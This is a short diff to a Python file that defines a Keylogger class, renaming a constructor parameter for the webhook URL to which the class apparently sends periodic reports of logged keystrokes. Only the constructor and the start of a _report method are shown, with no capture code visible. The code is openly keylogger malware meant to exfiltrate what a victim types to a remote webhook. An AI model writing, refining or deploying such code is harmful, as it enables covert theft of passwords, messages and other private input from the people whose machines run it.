@@ -8,10 +8,9 @@ TIME_INTERVAL = 10  # You can set the amount of time between each report
 
 
 class Keylogger:
-    def __init__(self, wb_url, interval=60):
-        self.wb_url = wb_url
+    def __init__(self, webhook_url, interval=60):
         self.interval = interval
-        self.webhook = Webhook(self.wb_url)
+        self.webhook = Webhook(webhook_url)
         self.log = ""
 
     def _report(self):
